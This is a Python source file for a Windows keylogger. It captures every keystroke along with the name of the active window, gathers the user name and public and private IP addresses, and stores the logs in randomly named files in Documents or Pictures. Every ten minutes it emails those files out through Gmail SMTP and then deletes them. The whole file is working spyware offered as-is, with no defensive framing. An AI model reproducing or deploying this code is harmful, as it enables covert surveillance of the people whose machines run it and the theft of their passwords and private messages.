from pynput.keyboard import Controller
from pynput.keyboard import Listener
import time,os,random,requests,socket
import win32gui
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import config
import threading
import traceback
#https://www.youtube.com/watch?v=lj_tcnWTzrU

publicIP = requests.get('https://api.ipify.org').text
privateIP = socket.gethostbyname(socket.gethostname())
user = os.path.expanduser('~').split('\\')[2]
datetime = time.ctime(time.time())

msg = "[Start of Logs]\n  ~DateTime {} \n ~UserProfile {}\n  ~PublicIP {} \n  ~PrivateIP {} \n \n  ".format(datetime,user,publicIP,privateIP)
logged_data = []
logged_data.append(msg)

old_app = ''
delete_file = []

def write_exit_file(value):
    fp = open('ExitFile.txt','w')
    fp.write(value)
    fp.close()
    
def read_exit_file():
    try:
        fp = open('ExitFile.txt','r')
        line = fp.readline()
        fp.close()
        print('value in file is {}'.format(line[0]))
        return str(line[0])
    except:
        print('Err reading file will return 0 for safer side')
        return '0'    
    
def on_press(key):
    global old_app
    
    new_app = win32gui.GetWindowText(win32gui.GetForegroundWindow()) 
    if new_app == 'Cortana':
        new_app = 'Windows start menu'
    else:
        pass
    
    substitution = ['Key.enter','[Enter]\n','Key.backspace','[BackSpace]','Key.space',' ','Key.alt_l','[Alt]','Key.tab','[Tab]',
                    'Key.delete','[DEL]','Key.ctrl_l','[CTRL]','Key.Left','[LEFT ARROW]','Key.right','[RIGHT ARROW]','Key.shift','[SHIFT]',
                    '\\x13','[CTRL-S]','\\x17','[CTRL-W]','Key.caps_Lock','[CAPS LK]','\\x@1','[CTRL-A]','Key.print_screen','[PRNT SCR]',
                    '\\x@3','[CTRL-C]','\\x16','[CTRL-V]','Key.cmd','[WINDOWS KEY]' ]
    key = str(key).strip('\'')
    if key in substitution:
        logged_data.append(substitution[substitution.index(key) + 1])
    else:
        logged_data.append(key)
    
    if read_exit_file() != '0':
        return False
        
def write_file(count):
    print('inside write_File')
    one = os.path.expanduser('~') + '/Documents/'
    two = os.path.expanduser('~') + '/Pictures/'
    list  = [one,two]
    filepath = random.choice(list)
    filename = '{}I{}.txt'.format(str(count),random.randint(10000000,99999999))
    file = filepath + filename
    delete_file.append(file)
    print('Writing file {}'.format(file))
    with open(file,'w') as fp:
        fp.write(''.join(logged_data))

    
def send_logs():
    print('Start of send_logs')
    count = 0 
    from_addr = config.from_addr
    from_pass = config.from_pass
    to_addr = from_addr
    
    MIN  = 10
    SECONDS = 60
    time.sleep(MIN*SECONDS) #every 10 mins.. write file and send log 
    #time.sleep(10)
    while True:
        if len(logged_data) > 1:
            try:
                write_file(count)
                subject = f'[{user}] ~ [{count}]'
                msg = MIMEMultipart()
                msg['From'] = from_addr
                msg['To'] = to_addr
                msg['Subject'] = subject
                body = 'testing'
                msg.attach(MIMEText(body,'plain'))
                attachment = open(delete_file[0],'rb')
                filename = delete_file[0].split('/')[2]
                
                part = MIMEBase('application','octect-stream')
                part.set_payload((attachment).read())
                encoders.encode_base64(part)
                part.add_header('content-disposition','attachment;filename=' + str(filename))
                msg.attach(part)
                text = msg.as_string()
                
                s= smtplib.SMTP('smtp.gmail.com',587)
                s.ehlo()
                s.starttls()
                s.ehlo()
                s.login(from_addr,from_pass)
                s.sendmail(from_addr,to_addr,text)
                attachment.close()
                s.close()
                os.remove(delete_file[0])
                del logged_data[1:]
                del delete_file[0:]
                count += 1
                print('Mail sent')
            except:
                print('Exception...')
                traceback.print_exc()
                pass
                
if __name__ == '__main__':
    t1 = threading.Thread(target = send_logs)
    t1.start()
       
    with Listener(on_press = on_press) as l:
        l.join()

           